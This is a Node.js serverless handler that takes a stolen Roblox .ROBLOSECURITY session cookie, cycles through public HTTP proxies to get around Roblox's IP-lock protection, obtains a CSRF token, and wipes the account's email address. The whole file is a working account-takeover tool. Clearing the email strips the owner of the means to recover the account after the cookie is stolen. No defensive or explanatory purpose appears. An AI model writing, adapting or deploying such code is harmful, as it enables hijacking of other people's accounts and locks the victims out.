const { HttpsProxyAgent } = require('https-proxy-agent');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    
    // Mobile User-Agent (bypasses some desktop IP locks)
    const baseHeaders = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Roblox/Android (2.574.0)',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/'
    };

    try {
        // Fetch a massive proxy list
        const proxyRes = await fetch('https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt');
        const proxyText = await proxyRes.text();
        const proxies = proxyText.split('\n').map(p => p.trim()).filter(p => p.length > 0);

        // Try up to 15 proxies
        for (let i = 0; i < Math.min(proxies.length, 15); i++) {
            const agent = new HttpsProxyAgent(`http://${proxies[i]}`);
            const fetchOptions = { headers: baseHeaders, agent: agent };

            try {
                // 1. Verify Cookie via Proxy
                const authCheck = await fetch('https://users.roblox.com/v1/users/authenticated', fetchOptions);
                
                if (authCheck.status === 200) {
                    // 2. Get CSRF
                    const csrfRes = await fetch('https://auth.roblox.com/v2/logout', { ...fetchOptions, method: 'POST' });
                    const csrfToken = csrfRes.headers.get('x-csrf-token');
                    
                    if (!csrfToken) continue; // Try next proxy if no CSRF

                    // 3. Wipe Email
                    const wipeRes = await fetch('https://accountsettings.roblox.com/v1/email', {
                        ...fetchOptions,
                        method: 'POST',
                        headers: { ...baseHeaders, 'X-CSRF-TOKEN': csrfToken },
                        body: JSON.stringify({ emailAddress: "" })
                    });

                    if (wipeRes.status === 200) {
                        return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
                    } else if (wipeRes.status === 403) {
                        return res.status(403).json({ success: false, message: "Blocked: Roblox requires the account password to remove the email." });
                    }
                }
            } catch (err) {
                continue; // Proxy died or connection reset, try the next one
            }
        }

        res.status(500).json({ success: false, message: 'All Vercel IPs and Proxies blocked by Roblox. The cookie is IP-locked to your Mac.' });

    } catch (error) {
        res.status(500).json({ success: false, message: `Network Error: ${error.message}` });
    }
}
